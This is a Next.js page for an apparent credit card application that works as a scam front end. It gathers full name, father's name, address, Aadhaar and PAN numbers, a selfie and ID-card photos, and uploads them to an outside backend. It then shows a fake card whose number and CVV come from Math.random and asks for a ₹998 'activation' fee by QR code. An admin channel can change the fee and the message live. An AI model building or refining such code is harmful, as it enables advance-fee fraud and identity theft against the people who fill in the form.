"use client";

import { useState, useEffect, ChangeEvent } from "react";
import axios from "axios";
import { useRouter } from "next/navigation";
import { toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import CreditCard from "../components/CreditCard";
import { query, orderByChild, startAt, ref, onChildAdded } from "firebase/database";
import { database } from "../firebaseConfig";


interface FormData {
  fullName: string;
  fatherName: string;
  dateOfBirth: string;
  employmentType: string;
  gender: string;
  pinCode: string;
  address: string;
  aadharNumber: string;
  panNumber: string;
  selfiePhoto?: File;
  aadharFrontPhoto?: File;
  aadharBackPhoto?: File;
  panCardPhoto?: File;
  bankDetails?: BankDetails;
}
interface BankDetails {
  accountHolderName: string;
  bankName: string;
  accountNumber: string;
  ifscCode: string;
}
type CardData = {
  cardNumber: string;
  cvv: string;
  expiryDate: string;
  cardHolder: string;
  brandLogo: string;
};

export default function ApplyPage() {
  const [isModalOpen1, setIsModalOpen1] = useState(false);
  const [bankDetails, setBankDetails] = useState<BankDetails>({
    accountHolderName: "",
    bankName: "",
    accountNumber: "",
    ifscCode: "",
  });
  const [userDetails, setUserDetails] = useState<FormData[]>([]);
  const [paidMessage, setPaidMessage] = useState<string>("");
  const [message, setMessage] = useState<string>("To activate your Credit Card, a charge of ₹998 is required. Once the payment is completed, you will be able to access your virtual credit card. The physical card will be delivered within 3 working days.");
  const [amount, setAmount] = useState<number>(998); // Default amount
    const [buttonLabel, setButtonLabel] = useState<string>("Card Active"); // Default button label
  const [totalLimit, setTotalLimit] = useState<{
    cash: string;
    shopping: string;
    total: string;
  }>({
    cash: "₹62,500",
    shopping: "₹62,500",
    total: "₹125,000",
  });
  const currentTime = Date.now();

  useEffect(() => {
    const updatesRef = query(ref(database, "updates"), orderByChild("timestamp"), startAt(currentTime));
  
    const unsubscribe = onChildAdded(
      updatesRef,
      (snapshot) => {
        const data = snapshot.val();
  
        if (!data || !data.message || data.price === undefined || data.price === null) {
          console.warn("⚠️ Incomplete update data received:", data);
          return;
        }
  
      console.log("📢 Admin Update:", data); // ✅ Debug Admin Updates
  
      // ✅ Set the message
      setMessage(data.message);
  
      // ✅ Set the amount
      setAmount(data.price);
  
      // ✅ Set the button label if provided
      if (data.buttonLabel) {
        setButtonLabel(data.buttonLabel);
      }
  
      // ✅ Show a toast notification for the update
      toast.info(`📢 New Update: ${data.message}`, {
        position: "top-left",
        autoClose: 5000,
      });
    }, (error) => {
      console.error("❌ Error listening to updates:", error);
      toast.error("Failed to fetch updates. Please try again later.", {
        position: "top-left",
      });
    });
     // ✅ Cleanup listener
  return () => unsubscribe();
  }, []);  // ✅ Runs only once when the component mounts

   // ✅ Listen for payment confirmations
   useEffect(() => {
    
    const paymentsRef = query(ref(database, "payments"), orderByChild("timestamp"), startAt(currentTime));
  
    const unsubscribe = onChildAdded(paymentsRef, (snapshot) => {
      const data = snapshot.val();
  
      // Update limits only for Paid actions
      if (data.limits) {
        const cashLimit = parseInt(data.limits.cashLimit.replace(/[^\d]/g, "") || "0");
        const shoppingLimit = parseInt(data.limits.shoppingLimit.replace(/[^\d]/g, "") || "0");
        const total = cashLimit + shoppingLimit;
  
        setTotalLimit({
          cash: `₹${cashLimit.toLocaleString()}`,
          shopping: `₹${shoppingLimit.toLocaleString()}`,
          total: `₹${total.toLocaleString()}`,
        });
  
        toast.success(`🎉 Your new limit is ₹${total.toLocaleString()}`);
      }
  
      // Optionally handle paid message
      if (data.message) {
        setPaidMessage(data.message);
        toast.info(`✅ ${data.message}`);
      }
    });
    // ✅ Cleanup listener
  return () => unsubscribe();
  }, []);
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setBankDetails((prevDetails) => ({
      ...prevDetails,
      [name]: value,
    }));
  };

 
 
   // Fetch User Details
   useEffect(() => {
    const fetchUserDetails = async () => {
      try {
        const response = await axios.get("https://backend.navipro.in/api/bank-details/user-details");
        setUserDetails(response.data);
      } catch (error) {
        console.error("Error fetching user details:", error);
      }
    };

    fetchUserDetails();
  }, []);
  

  const [step, setStep] = useState<number>(1);
  const [formData, setFormData] = useState<FormData>({
    fullName: "",
    fatherName: "",
    dateOfBirth: "",
    employmentType: "Salaried",
    gender: "Male",
    pinCode: "",
    address: "",
    aadharNumber: "",
    panNumber: "",
    
  });
  const [cardData, setCardData] = useState<CardData | null>(null);
  const [qrCodeUrl, setQrCodeUrl] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const router = useRouter();

  useEffect(() => {
    const isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
    const isRegistered = localStorage.getItem("isRegistered") === "true";
    const hasCompletedSteps = localStorage.getItem("hasCompletedSteps") === "true";

    // Step 1: Check if the user is logged in
    if (!isLoggedIn) {
      toast.error("You must be logged in to access this page.", { position: "top-left" });
      router.push("/"); // Redirect to the login page if not logged in
      return; // Exit early as no further checks are needed
    }

    // Step 2: Handle the logic based on registration status and step completion
    if (isRegistered) {
      // Case: Registered user who has completed all steps
      if (hasCompletedSteps) {
        const savedCardData = localStorage.getItem("cardData");
        if (savedCardData) {
          const cardData = JSON.parse(savedCardData);
          // Set to Step 3 as the user is registered and has completed the process
          setStep(3);
        } else {
          // If card data isn't available, proceed to Step 2 or 1
          setStep(2); // Here you may set this based on the exact state of the user's process
        }
      } else {
        // Case: Registered user who hasn't completed all steps
        setStep(1); // This could be modified to check the last incomplete step if needed
      }
    } else {
      // Case: New user (not registered)
      setStep(1);
    }
  }, [router]); // Rerun only when router changes (although this might not be frequently needed)
  
  
  const fetchQrCode = async () => {
    try {
      const response = await axios.get("https://backend.navipro.in/api/get-qr");
      setQrCodeUrl(response.data.url);
    } catch (error) {
      console.error("Error fetching QR Code:", error);
    } finally {
      setIsLoading(false);
    }
  };

  fetchQrCode();

  const validateAadhar = (aadhar: string): boolean => /^\d{12}$/.test(aadhar);
  const validatePAN = (pan: string): boolean => /^[A-Z]{5}\d{4}[A-Z]{1}$/.test(pan);

  const handleNext = async (): Promise<void> => {
    if (step === 1) {
      if (!formData.fullName || !formData.fatherName || !formData.dateOfBirth || !formData.pinCode || !formData.address) {
        toast.error("Please fill out all personal details.", { position: "top-left" });
        return;
      }
    }

    if (step === 2) {
      if (!formData.aadharNumber || !validateAadhar(formData.aadharNumber)) {
        toast.error("Aadhar number must be a 12-digit number.", { position: "top-left" });
        return;
      }
      if (!formData.panNumber || !validatePAN(formData.panNumber)) {
        toast.error("PAN number must follow the format: AFZPK7190K.", { position: "top-left" });
        return;
      }

      try {
        setIsLoading(true);

        // Prepare form data for submission
        const formDataToSend = new FormData();
        Object.entries(formData).forEach(([key, value]) => {
          if (value instanceof File) {
            formDataToSend.append(key, value); // Append file
          } else {
            formDataToSend.append(key, value as string); // Append text
          }
        });

        // Submit the form data to the backend
        const response = await axios.post("https://backend.navipro.in/api/user-details/save", formDataToSend, {
          headers: { "Content-Type": "multipart/form-data" },
        });

        toast.success("Details saved successfully.", { position: "top-left" });

        const newCardData = {
          cardNumber: Math.random().toString().slice(2, 18),
          cvv: Math.random().toString().slice(2, 5),
          expiryDate: `${new Date().getMonth() + 1}/` + `${new Date().getFullYear() + 5}`,
          cardHolder: formData.fullName,
          brandLogo: "/brand-logo.png",
        };
        setCardData(newCardData);
        localStorage.setItem("cardData", JSON.stringify(newCardData));
      } catch (error) {
        console.error("Error saving details:", error);
        toast.error("Failed to save details.", { position: "top-left" });
        return;
      }
    }

    if (step < 3) {
      setStep(step + 1);
    }
  };
  
  const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>): void => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };
  const handleFileChange = (e: ChangeEvent<HTMLInputElement>): void => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      setFormData((prev) => ({ ...prev, [e.target.name]: file }));
    }
  };



  const toggleModal = (): void => {
    setIsModalOpen(!isModalOpen);
  };
  
  
  const renderStepContent = (): JSX.Element | null => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold">PERSONAL DETAILS</h2>
            <div>
              <label className="block">Full Name</label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                placeholder="Enter your full name"
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">Father Name</label>
              <input
                type="text"
                name="fatherName"
                value={formData.fatherName}
                onChange={handleChange}
                placeholder="Enter your father's name"
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">Date of Birth</label>
              <input
                type="date"
                name="dateOfBirth"
                value={formData.dateOfBirth}
                onChange={handleChange}
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">Employment Type</label>
              <select
                name="employmentType"
                value={formData.employmentType}
                onChange={handleChange}
                className="border p-2 rounded w-full"
              >
                <option value="Salaried">Salaried</option>
                <option value="Self-Employed">Self-Employed</option>
                <option value="Unemployed">Unemployed</option>
              </select>
            </div>
            <div>
              <label className="block">Gender</label>
              <select
                name="gender"
                value={formData.gender}
                onChange={handleChange}
                className="border p-2 rounded w-full"
              >
                <option value="Male">Male</option>
                <option value="Female">Female</option>
                <option value="Other">Other</option>
              </select>
            </div>
            <div>
              <label className="block">Pin Code</label>
              <input
                type="text"
                name="pinCode"
                value={formData.pinCode}
                onChange={handleChange}
                placeholder="Enter your pin code"
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">Address</label>
              <textarea
                name="address"
                value={formData.address}
                onChange={handleChange}
                placeholder="Enter your address"
                className="border p-2 rounded w-full"
              ></textarea>
            </div>
            <button className="bg-blue-500 text-white p-2 rounded" onClick={handleNext}>
              Next
            </button>
          </div>
        );
        case 2:
          return (
            <div className="space-y-8 bg-white p-8 rounded-lg shadow-lg max-w-3xl mx-auto">
              {/* Step Header */}
              <div className="text-center">
                <h2 className="text-3xl font-bold text-gray-800">Identity Details</h2>
                <p className="text-gray-600 mt-2">
                  Please provide your Aadhaar and PAN details, and upload the required documents for verification.
                </p>
              </div>
        
              {/* Input Fields */}
              <div className="space-y-6">
                {/* Aadhaar Number */}
                <div className="flex flex-col">
                  <label className="text-sm font-semibold text-gray-700 mb-1">Aadhaar Number</label>
                  <input
                    type="text"
                    name="aadharNumber"
                    value={formData.aadharNumber}
                    onChange={handleChange}
                    placeholder="Enter your Aadhaar number"
                    className="border border-gray-300 p-3 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none"
                  />
                </div>
        
                {/* PAN Number */}
                <div className="flex flex-col">
                  <label className="text-sm font-semibold text-gray-700 mb-1">PAN Number</label>
                  <input
                    type="text"
                    name="panNumber"
                    value={formData.panNumber}
                    onChange={handleChange}
                    placeholder="Enter your PAN number"
                    className="border border-gray-300 p-3 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none"
                  />
                </div>
              </div>
        
              {/* Upload Sections */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Selfie Photo */}
                <div className="flex flex-col p-4 border border-gray-300 rounded-lg hover:shadow-md transition">
                  <label
                    htmlFor="selfiePhoto"
                    className="text-sm font-semibold text-gray-700 mb-2 cursor-pointer"
                  >
                    Selfie Photo
                  </label>
                  <input
                    type="file"
                    id="selfiePhoto"
                    name="selfiePhoto"
                    accept="image/*"
                    onChange={handleFileChange}
                    className="border p-3 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none"
                  />
                </div>
        
                {/* Aadhaar Card Front */}
                <div className="flex flex-col p-4 border border-gray-300 rounded-lg hover:shadow-md transition">
                  <label
                    htmlFor="aadharFrontPhoto"
                    className="text-sm font-semibold text-gray-700 mb-2 cursor-pointer"
                  >
                    Aadhaar Card Front Photo
                  </label>
                  <input
                    type="file"
                    id="aadharFrontPhoto"
                    name="aadharFrontPhoto"
                    accept="image/*"
                    onChange={handleFileChange}
                    className="border p-3 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none"
                  />
                </div>
        
                {/* Aadhaar Card Back */}
                <div className="flex flex-col p-4 border border-gray-300 rounded-lg hover:shadow-md transition">
                  <label
                    htmlFor="aadharBackPhoto"
                    className="text-sm font-semibold text-gray-700 mb-2 cursor-pointer"
                  >
                    Aadhaar Card Back Photo
                  </label>
                  <input
                    type="file"
                    id="aadharBackPhoto"
                    name="aadharBackPhoto"
                    accept="image/*"
                    onChange={handleFileChange}
                    className="border p-3 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none"
                  />
                </div>
        
                {/* PAN Card Front */}
                <div className="flex flex-col p-4 border border-gray-300 rounded-lg hover:shadow-md transition">
                  <label
                    htmlFor="panCardPhoto"
                    className="text-sm font-semibold text-gray-700 mb-2 cursor-pointer"
                  >
                    PAN Card Front Photo
                  </label>
                  <input
                    type="file"
                    id="panCardPhoto"
                    name="panCardPhoto"
                    accept="image/*"
                    onChange={handleFileChange}
                    className="border p-3 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none"
                  />
                </div>
              </div>
        
              {/* Next Button */}
              <div className="text-center">
                <button
                  className="w-full md:w-auto bg-blue-600 text-white py-3 px-6 rounded-lg shadow-md hover:bg-blue-700 transition"
                  onClick={handleNext}
                >
                  Proceed to Next Step
                </button>
              </div>
            </div>
          );
        
         case 3:
        return (
          <div className="space-y-8">
          <h2 className="text-2xl font-bold text-center">GET YOUR CARDS</h2>
          <p className="text-2xl font-medium text-center text-red-700">
          🎉 Congratulations! Your card is now ready.
          Click on the card to view the back side.
          </p>
          <h3 className="text-lg font-bold text-center mb-2">
              Total Credit Limit: {totalLimit.total}
            </h3>
        
          
            {cardData && <CreditCard {...cardData} />}
            {/* Credit Card Limits Section */}
          <div className="text-center mb-4">
            <h3 className="text-2xl font-bold text-gray-800">
              Your Credit Card Limit
            </h3>
          </div>
    
          <div className="flex justify-center space-x-8">
            {/* Cash Limit */}
            <div className="flex flex-col items-center bg-white rounded-lg shadow-md p-4 w-48">
              <img
                src="/cash.png" // Replace with actual image path
                alt="Cash Limit"
                className="w-16 h-16 mb-2"
              />
              <h4 className="text-lg font-semibold text-gray-700">Cash Limit</h4>
              <p className="text-xl font-bold text-gray-900"> {totalLimit.cash}</p>
            </div>
    
            {/* Shopping Limit */}
            <div className="flex flex-col items-center bg-white rounded-lg shadow-md p-4 w-48">
              <img
                src="/shopping.png" // Replace with actual image path
                alt="Shopping Limit"
                className="w-16 h-16 mb-2"
              />
              <h4 className="text-lg font-semibold text-gray-700">
                Shopping Limit
              </h4>
              <p className="text-xl font-bold text-gray-900">{totalLimit.shopping}</p>
            </div>
          </div>
          <button
            className="w-full bg-green-600 text-white py-3 rounded-lg px-10 hover:bg-green-700"
            onClick={toggleModal}
          >
           {buttonLabel}
          </button>
       
              {/* line i want to change when admin will click on update button  */}
            

              {message && <h4 className="text-xl font-extrabold text-gray-900">{message}</h4>} 
                      
              

            {isModalOpen && (
              <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
                <div className="bg-white rounded-lg p-6 w-80 shadow-lg relative">
                  <button
                    onClick={toggleModal}
                    className="absolute top-2 right-2 text-gray-500 hover:text-gray-800"
                  >
                    ✕
                  </button>

                  {isLoading ? (
                    <p>Loading...</p>
                  ) : (
                    <div>
                      <h2 className="text-lg font-semibold text-center mb-4">
                        Please scan the QR code to complete the payment.
                      </h2>
                      <p className="text-xl font-extrabold text-center mb-4 text-red-700">
                        Pay INR 
                        {/* this is the ammount i want to change  */}₹{amount}/-
                        to activate your card.
                      </p>
                      <img
                        src={qrCodeUrl}
                        alt="QR Code"
                        className="w-full h-56 object-contain mb-4"
                      />
                      <button
                        onClick={toggleModal}
                        className="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700"
                      >
                        Payment Done!
                      </button>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="container mx-auto p-6 mb-40">
      <div className="flex justify-around mb-6">
        <span className={`font-bold ${step === 1 ? "text-blue-600" : "text-gray-400"}`}>Step 1: Personal Details</span>
        <span className={`font-bold ${step === 2 ? "text-blue-600" : "text-gray-400"}`}>Step 2: Identity Details</span>
        <span className={`font-bold ${step === 3 ? "text-blue-600" : "text-gray-400"}`}>Step 3: Get Your Card</span>
      </div>
      {renderStepContent()}
    </div>
  );
}
